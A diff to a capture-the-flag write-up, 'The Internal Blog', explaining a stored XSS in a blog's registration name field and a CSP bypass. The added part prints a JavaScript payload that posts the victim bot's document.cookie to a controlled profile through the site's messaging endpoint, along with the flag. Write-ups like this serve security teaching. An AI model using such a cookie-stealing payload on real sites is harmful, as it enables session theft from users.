@@ -1,5 +1,5 @@
 # The Internal Blog 
-<p align="justify">The goal of this Web challenge was to find a way to steal bot's cookies. To do so, a blog website was deployed and vulnerable to XSS attack. No specific informations were provided in the description of the challenge, no source files. Even if the source code wasn't provided this WU will include source snippets for more precision in explanations </p>
+<p align="justify">The goal of this Web challenge was to find a way to steal bot's cookies. To do so, a blog website was deployed and vulnerable to XSS attack. No specific informations were provided in the description of the challenge, no source files.</p>
 
 <p align="center"> 
   <img src="Screenshots/S1.png" style="width:50%">
@@ -39,7 +39,45 @@ await newProfile.save();
     }
 ````
 
-<p align="justify">Hence, it was possible to access the profile containing javascript payload, despite filter function. It seemed it was actually the name file in the registration form which was vulnerable to XSS and reflected the javascript payload : </p>
+<p align="justify">Hence, it was possible to access the profile containing javascript payload, despite filter function. It seemed it was actually the name field in the registration form which was vulnerable to XSS and reflected the javascript payload : </p>
+
+<p align="center"> 
+  <img src="Screenshots/S4.png" >
+</p>
+
+<p align="justify">After the name field was identified, a fetch to request endpoint triggered a CSP applied to user profile page. To get the flag and trap the bot, a bypass was required. 2 solutions where possible : </p>
+  
+- Using a redirection payload
+- Using message feature to send the flag on a controlled profile, using contact ID
+  
+<p align="center"> 
+  <img src="Screenshots/S5.png" >
+</p>
+
+<p align="justify">The payload below triggered the bot, forcing it to send the flag in message on a controlled profile. Once the profile created with the payload as name, as mentionned in the articles released by Administrator, it was necessary to publish an article and get a visit from the bot. </p>
+
+````javascript
+script>
+  fetch('http://localhost:3000/sendmessage', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded',
+    },
+    body: new URLSearchParams({
+      contact: 'c87531e5-c979-4625-9966-45478ecf17f1', 
+      message: document.cookie, 
+    }),
+  });
+</script>
+````
+
+<p align="justify">Once the profile created containing the payload and an article realeased using the token associated, the flag is finally sent as a message : </p>
+
+<p align="center"> 
+  <img src="Screenshots/S6.png" >
+</p>
+
+_FLAG=HACKDAY{0rd3R_M4tteRs_In_Ur_C0d3!!!!}_ 
 
 
 
